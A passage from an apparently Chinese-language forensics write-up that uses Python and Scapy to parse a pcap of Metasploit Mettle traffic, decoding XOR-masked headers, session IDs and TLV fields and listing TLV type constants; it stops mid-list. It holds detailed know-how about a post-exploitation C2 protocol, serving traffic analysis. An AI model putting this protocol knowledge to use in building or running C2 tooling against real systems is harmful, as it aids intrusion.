<p>现在使用Python &#x2F; Scapy来解析pcap。从数据流的角度来考虑，而不是数据包，所以将从将所有数据放入一个流开始。这里有一些风险，将攻击者和受害者的流量结合在一起。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pull all bytes into a stream</span></span><br><span class="line">pcap = rdpcap(<span class="string">&quot;./msf.pcap&quot;</span>)</span><br><span class="line">stream = <span class="string">b&quot;&quot;</span>.join([<span class="built_in">bytes</span>(packet[TCP].payload) <span class="keyword">for</span> packet <span class="keyword">in</span> pcap <span class="keyword">if</span> TCP <span class="keyword">in</span> packet])</span><br></pre></td></tr></table></figure>

<p>现在我将从0开始处理数据流。需要一个快速XOR的函数，以及一个字典来跟踪加密类型:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">enc_types = &#123;0: <span class="string">&quot;None&quot;</span>, 1: <span class="string">&quot;AES256&quot;</span>, 2: <span class="string">&quot;AES128&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">def xor(buf, key):</span><br><span class="line">    <span class="built_in">return</span> bytes([x ^ key[i % len(key)] <span class="keyword">for</span> i, x <span class="keyword">in</span> enumerate(buf)])</span><br></pre></td></tr></table></figure>

<p>现在循环，将前32个字节作为头文件，并解析它:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">i = 0</span><br><span class="line"><span class="keyword">while</span> i &lt; len(stream):</span><br><span class="line">    xor_head = stream[i:i+32]</span><br><span class="line">    xor_key = xor_head[:4]</span><br><span class="line">    <span class="built_in">head</span> = xor(xor_head, xor_key)</span><br><span class="line">    session_guid = <span class="built_in">head</span>[4:20]</span><br><span class="line">    enc_flag = int.from_bytes(<span class="built_in">head</span>[20:24], <span class="string">&quot;big&quot;</span>)</span><br><span class="line">    packet_len = int.from_bytes(<span class="built_in">head</span>[24:28], <span class="string">&quot;big&quot;</span>)</span><br><span class="line">    packet_type = int.from_bytes(<span class="built_in">head</span>[28:32], <span class="string">&quot;big&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(f<span class="string">&quot;Packet: type=&#123;packet_type:&lt;4&#125; len=&#123;packet_len:&lt;8&#125; enc=&#123;enc_types[enc_flag]&#125; sess=&#123;uuid.UUID(bytes=session_guid)&#125;&quot;</span>)</span><br><span class="line">    i += 24 + packet_len</span><br></pre></td></tr></table></figure>

<p>我将获得XOR key，然后将其应用到整个头部。然后我可以获得会话、加密标志、数据包长度和类型。打印这些，看看它们是否有意义:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kali@hacky<span class="comment"># python -i parse_msf.py </span></span><br><span class="line">Packet: <span class="built_in">type</span>=0    len=363      enc=None sess=00000000-0000-0000-0000-000000000000</span><br><span class="line">Packet: <span class="built_in">type</span>=1    len=373      enc=None sess=00000000-0000-0000-0000-000000000000</span><br><span class="line">Packet: <span class="built_in">type</span>=0    len=88       enc=AES256 sess=00000000-0000-0000-0000-000000000000</span><br><span class="line">Packet: <span class="built_in">type</span>=1    len=168      enc=AES256 sess=00000000-0000-0000-0000-000000000000</span><br><span class="line">Packet: <span class="built_in">type</span>=0    len=104      enc=AES256 sess=00000000-0000-0000-0000-000000000000</span><br><span class="line">Packet: <span class="built_in">type</span>=1    len=120      enc=AES256 sess=6b2f41af-eb74-454f-9606-77b703dab297</span><br><span class="line">Packet: <span class="built_in">type</span>=0    len=104      enc=AES256 sess=6b2f41af-eb74-454f-9606-77b703dab297</span><br><span class="line">Packet: <span class="built_in">type</span>=1    len=648      enc=AES256 sess=6b2f41af-eb74-454f-9606-77b703dab297</span><br><span class="line">Packet: <span class="built_in">type</span>=0    len=88       enc=AES256 sess=6b2f41af-eb74-454f-9606-77b703dab297</span><br><span class="line">...[snip]...</span><br></pre></td></tr></table></figure>

<p>它开始时没有session id，也没有加密，然后开始加密，然后生成session id。类型0看起来像是攻击者传给受害者的数据，而类型1看起来像是受害者传给攻击者的数据。这与<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JhcGlkNy9tZXR0bGUvYmxvYi81MmRlM2M4OTI3MDFlMDEwMTc0NmI0NmVlOGI0N2I3NmNkZThkMmQ0L21ldHRsZS9zcmMvdGx2X3R5cGVzLmgjTDEwLUwxMQ==">mettle source<i class="fa fa-external-link-alt"></i></span>中的常数相匹配:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define TLV_PACKET_TYPE_REQUEST  0</span></span><br><span class="line"><span class="comment">#define TLV_PACKET_TYPE_RESPONSE 1</span></span><br></pre></td></tr></table></figure>

<p>在脚本顶部添加 packet_types &#x3D; {0: “Req”， 1: “Resp”}，并将输出更改为显示字符串名称而不是数字。</p>
<h2 id="解析未加密的TLVs数据流"><a href="#解析未加密的TLVs数据流" class="headerlink" title="解析未加密的TLVs数据流"></a>解析未加密的TLVs数据流</h2><p>在前面的步骤中，跳过数据包中的所有数据。要解析加密数据包，需要AES密钥。但现在可以处理未加密的数据包了。<br>在打印数据包信息之后，在I增加之前，将添加:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">...[snip]...</span><br><span class="line">   <span class="built_in">print</span>(f<span class="string">&quot;Packet: type=&#123;packet_types[packet_type]:&lt;4&#125; len=&#123;packet_len:&lt;8&#125; enc=&#123;enc_types[enc_flag]&#125; sess=&#123;uuid.UUID(bytes=session_guid)&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    tlv_data = xor(stream[i+32:i+packet_len+24], xor_key)</span><br><span class="line">    <span class="keyword">if</span> enc_flag == 1:</span><br><span class="line">        aes_iv = tlv_data[:16]</span><br><span class="line">        tlv_data = tlv_data[16:]</span><br><span class="line">        <span class="comment"># future decrypt here</span></span><br><span class="line"></span><br><span class="line">    j = 0</span><br><span class="line">    <span class="comment"># skip encrypted for now</span></span><br><span class="line">    <span class="keyword">while</span> j &lt; len(tlv_data) and enc_flag == 0:</span><br><span class="line">        l = int.from_bytes(tlv_data[j:j+4], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        t = int.from_bytes(tlv_data[j+4:j+8], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        v = tlv_data[j+8:j+l]</span><br><span class="line">        <span class="built_in">print</span>(f<span class="string">&quot;TLV l=&#123;l:&lt;8&#125; t=0x&#123;t:&lt;6x&#125; v=&#123;v if len(v) &lt;= 26 else v[:26]&#125;&quot;</span>)</span><br><span class="line">        j += l</span><br><span class="line">    </span><br><span class="line">    i += 24 + packet_len</span><br></pre></td></tr></table></figure>

<p>这将获得TLV数据，并对其进行xor。然后，如果数据包是加密的，它pulls IV并向前移动。现在它会遍历数据，但如果数据被加密就会break。下面输出了前两个包发送的消息:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">kali@hacky$ python parse_msf.py </span><br><span class="line">Packet: <span class="built_in">type</span>=Req  len=363      enc=None sess=00000000-0000-0000-0000-000000000000</span><br><span class="line">TLV l=12       t=0x20001  v=b<span class="string">&#x27;\x00\x00\x00\x10&#x27;</span></span><br><span class="line">TLV l=41       t=0x10002  v=b<span class="string">&#x27;20785548998507895601672178&#x27;</span></span><br><span class="line">TLV l=302      t=0x40226  v=b<span class="string">&#x27;0\x82\x01&quot;0\r\x06\t*\x86H\x86\xf7\r\x01\x01\x01\x05\x00\x03\x82\x01\x0f\x000\x82&#x27;</span></span><br><span class="line">Packet: <span class="built_in">type</span>=Resp len=373      enc=None sess=00000000-0000-0000-0000-000000000000</span><br><span class="line">TLV l=24       t=0x401cd  v=b<span class="string">&#x27;\xd2\x99\x93k\xe4W`\x99f `&quot;\x04\x0fx\xaa&#x27;</span></span><br><span class="line">TLV l=12       t=0x20001  v=b<span class="string">&#x27;\x00\x00\x00\x10&#x27;</span></span><br><span class="line">TLV l=41       t=0x10002  v=b<span class="string">&#x27;20785548998507895601672178&#x27;</span></span><br><span class="line">TLV l=12       t=0x20004  v=b<span class="string">&#x27;\x00\x00\x00\x00&#x27;</span></span><br><span class="line">TLV l=12       t=0x20227  v=b<span class="string">&#x27;\x00\x00\x00\x01&#x27;</span></span><br><span class="line">TLV l=264      t=0x40229  v=b<span class="string">&#x27;-I\x1d\xc1\xa3YLu\xa9\x99/\x96&gt;\xe9\x1f\x9c\xf9g~\x0fH8\xee\xe1y\xf1&#x27;</span></span><br><span class="line">Packet: <span class="built_in">type</span>=Req  len=88       enc=AES256 sess=00000000-0000-0000-0000-000000000000</span><br><span class="line">Packet: <span class="built_in">type</span>=Resp len=168      enc=AES256 sess=00000000-0000-0000-0000-000000000000</span><br><span class="line">...[snip]...</span><br></pre></td></tr></table></figure>

<p>让它打印出前26个字节的数据，因为这可能会有一些启示，而且它适合我的屏幕。将根据需要进行更改，以查看更多或更少的数据。<br>这完全没有必要，但是想看看所有的TLV消息类型是什么。它们定义在与上面相同的<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JhcGlkNy9tZXR0bGUvYmxvYi81MmRlM2M4OTI3MDFlMDEwMTc0NmI0NmVlOGI0N2I3NmNkZThkMmQ0L21ldHRsZS9zcmMvdGx2X3R5cGVzLmgjTDQ5LUwzMDc=">源代码tlv_type.h<i class="fa fa-external-link-alt"></i></span>中:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define TLV_TYPE_ANY                   (TLV_META_TYPE_NONE    | 0)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_COMMAND_ID            (TLV_META_TYPE_UINT    | 1)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_REQUEST_ID            (TLV_META_TYPE_STRING  | 2)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_EXCEPTION             (TLV_META_TYPE_GROUP   | 3)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_RESULT                (TLV_META_TYPE_UINT    | 4)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define TLV_TYPE_STRING                (TLV_META_TYPE_STRING  | 10)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_UINT                  (TLV_META_TYPE_UINT    | 11)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_BOOL                  (TLV_META_TYPE_BOOL    | 12)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define TLV_TYPE_LENGTH                (TLV_META_TYPE_UINT    | 25)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_DATA                  (TLV_META_TYPE_RAW     | 26)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_FLAGS                 (TLV_META_TYPE_UINT    | 27)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define TLV_TYPE_CHANNEL_ID            (TLV_META_TYPE_UINT    | 50)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_CHANNEL_TYPE          (TLV_META_TYPE_STRING  | 51)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_CHANNEL_DATA          (TLV_META_TYPE_RAW     | 52)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_CHANNEL_DATA_GROUP    (TLV_META_TYPE_GROUP   | 53)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_CHANNEL_CLASS         (TLV_META_TYPE_UINT    | 54)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_CHANNEL_PARENTID      (TLV_META_TYPE_UINT    | 55)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define TLV_TYPE_SEEK_WHENCE           (TLV_META_TYPE_UINT    | 70)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_SEEK_OFFSET           (TLV_META_TYPE_UINT    | 71)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_SEEK_POS              (TLV_META_TYPE_UINT    | 72)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define TLV_TYPE_EXCEPTION_CODE        (TLV_META_TYPE_UINT    | 300)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_EXCEPTION_STRING      (TLV_META_TYPE_STRING  | 301)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define TLV_TYPE_LIBRARY_PATH          (TLV_META_TYPE_STRING  | 400)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_TARGET_PATH           (TLV_META_TYPE_STRING  | 401)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_MIGRATE_PID           (TLV_META_TYPE_UINT    | 402)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_MIGRATE_LEN           (TLV_META_TYPE_UINT    | 403)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define TLV_TYPE_TRANS_TYPE            (TLV_META_TYPE_UINT    | 430)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_TRANS_URL             (TLV_META_TYPE_STRING  | 431)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_TRANS_UA              (TLV_META_TYPE_STRING  | 432)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_TRANS_COMM_TIMEOUT    (TLV_META_TYPE_UINT    | 433)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_TRANS_SESSION_EXP     (TLV_META_TYPE_UINT    | 434)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_TRANS_CERT_HASH       (TLV_META_TYPE_RAW     | 435)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_TRANS_PROXY_HOST      (TLV_META_TYPE_STRING  | 436)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_TRANS_PROXY_USER      (TLV_META_TYPE_STRING  | 437)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_TRANS_PROXY_PASS      (TLV_META_TYPE_STRING  | 438)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_TRANS_RETRY_TOTAL     (TLV_META_TYPE_UINT    | 439)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_TRANS_RETRY_WAIT      (TLV_META_TYPE_UINT    | 440)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_TRANS_GROUP           (TLV_META_TYPE_GROUP   | 441)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define TLV_TYPE_MACHINE_ID            (TLV_META_TYPE_STRING  | 460)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_UUID                  (TLV_META_TYPE_RAW     | 461)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_SESSION_GUID          (TLV_META_TYPE_RAW     | 462)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define TLV_TYPE_RSA_PUB_KEY           (TLV_META_TYPE_RAW     | 550)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_SYM_KEY_TYPE          (TLV_META_TYPE_UINT    | 551)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_SYM_KEY               (TLV_META_TYPE_RAW     | 552)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_ENC_SYM_KEY           (TLV_META_TYPE_RAW     | 553)</span></span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * General</span><br><span class="line"> */</span><br><span class="line"><span class="comment">#define TLV_TYPE_HANDLE                (TLV_META_TYPE_QWORD   | 600)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_INHERIT               (TLV_META_TYPE_BOOL    | 601)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_PROCESS_HANDLE        (TLV_META_TYPE_QWORD   | 630)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_THREAD_HANDLE         (TLV_META_TYPE_QWORD   | 631)</span></span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * Fs</span><br><span class="line"> */</span><br><span class="line"><span class="comment">#define TLV_TYPE_DIRECTORY_PATH        (TLV_META_TYPE_STRING  | 1200)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_FILE_NAME             (TLV_META_TYPE_STRING  | 1201)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_FILE_PATH             (TLV_META_TYPE_STRING  | 1202)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_FILE_MODE             (TLV_META_TYPE_STRING  | 1203)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_FILE_SIZE             (TLV_META_TYPE_UINT    | 1204)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_FILE_HASH             (TLV_META_TYPE_RAW     | 1206)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define TLV_TYPE_STAT_BUF              (TLV_META_TYPE_COMPLEX | 1221)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define TLV_TYPE_SEARCH_RECURSE        (TLV_META_TYPE_BOOL    | 1230)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_SEARCH_GLOB           (TLV_META_TYPE_STRING  | 1231)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_SEARCH_ROOT           (TLV_META_TYPE_STRING  | 1232)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_SEARCH_RESULTS        (TLV_META_TYPE_GROUP   | 1233)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define TLV_TYPE_FILE_MODE_T           (TLV_META_TYPE_UINT    | 1234)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_SEARCH_MTIME          (TLV_META_TYPE_UINT    | 1235)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_SEARCH_M_START_DATE   (TLV_META_TYPE_UINT    | 1236)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_SEARCH_M_END_DATE     (TLV_META_TYPE_UINT    | 1237)</span></span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * Net</span><br><span class="line"> */</span><br><span class="line"><span class="comment">#define TLV_TYPE_HOST_NAME             (TLV_META_TYPE_STRING  | 1400)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_PORT                  (TLV_META_TYPE_UINT    | 1401)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_INTERFACE_MTU         (TLV_META_TYPE_UINT    | 1402)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_INTERFACE_FLAGS       (TLV_META_TYPE_STRING  | 1403)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_INTERFACE_INDEX       (TLV_META_TYPE_UINT    | 1404)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define TLV_TYPE_SUBNET                (TLV_META_TYPE_RAW     | 1420)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_NETMASK               (TLV_META_TYPE_RAW     | 1421)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_GATEWAY               (TLV_META_TYPE_RAW     | 1422)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_NETWORK_ROUTE         (TLV_META_TYPE_GROUP   | 1423)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_IP_PREFIX             (TLV_META_TYPE_UINT    | 1424)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_ARP_ENTRY             (TLV_META_TYPE_GROUP   | 1425)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define TLV_TYPE_IP                    (TLV_META_TYPE_RAW     | 1430)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_MAC_ADDRESS           (TLV_META_TYPE_RAW     | 1431)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_MAC_NAME              (TLV_META_TYPE_STRING  | 1432)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_NETWORK_INTERFACE     (TLV_META_TYPE_GROUP   | 1433)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_IP6_SCOPE             (TLV_META_TYPE_RAW     | 1434)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define TLV_TYPE_SUBNET_STRING         (TLV_META_TYPE_STRING  | 1440)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_NETMASK_STRING        (TLV_META_TYPE_STRING  | 1441)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_GATEWAY_STRING        (TLV_META_TYPE_STRING  | 1442)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_ROUTE_METRIC          (TLV_META_TYPE_UINT    | 1443)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_ADDR_TYPE             (TLV_META_TYPE_UINT    | 1444)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define TLV_TYPE_PROXY_CFG_AUTODETECT    (TLV_META_TYPE_BOOL  | 1445)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_PROXY_CFG_AUTOCONFIGURL (TLV_META_TYPE_STRING| 1446)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_PROXY_CFG_PROXY         (TLV_META_TYPE_STRING| 1447)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_PROXY_CFG_PROXYBYPASS   (TLV_META_TYPE_STRING| 1448)</span></span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * Socket</span><br><span class="line"> */</span><br><span class="line"><span class="comment">#define TLV_TYPE_PEER_HOST             (TLV_META_TYPE_STRING  | 1500)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_PEER_PORT             (TLV_META_TYPE_UINT    | 1501)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_LOCAL_HOST            (TLV_META_TYPE_STRING  | 1502)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_LOCAL_PORT            (TLV_META_TYPE_UINT    | 1503)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_CONNECT_RETRIES       (TLV_META_TYPE_UINT    | 1504)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_NETSTAT_ENTRY         (TLV_META_TYPE_GROUP   | 1505)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_PEER_HOST_RAW         (TLV_META_TYPE_RAW     | 1506)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_LOCAL_HOST_RAW        (TLV_META_TYPE_RAW     | 1507)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define TLV_TYPE_SHUTDOWN_HOW          (TLV_META_TYPE_UINT    | 1530)</span></span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * Registry</span><br><span class="line"> */</span><br><span class="line"><span class="comment">#define TLV_TYPE_HKEY                  (TLV_META_TYPE_QWORD   | 1000)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_ROOT_KEY              (TLV_TYPE_HKEY)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_BASE_KEY              (TLV_META_TYPE_STRING  | 1001)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_PERMISSION            (TLV_META_TYPE_UINT    | 1002)</span></span><br><span 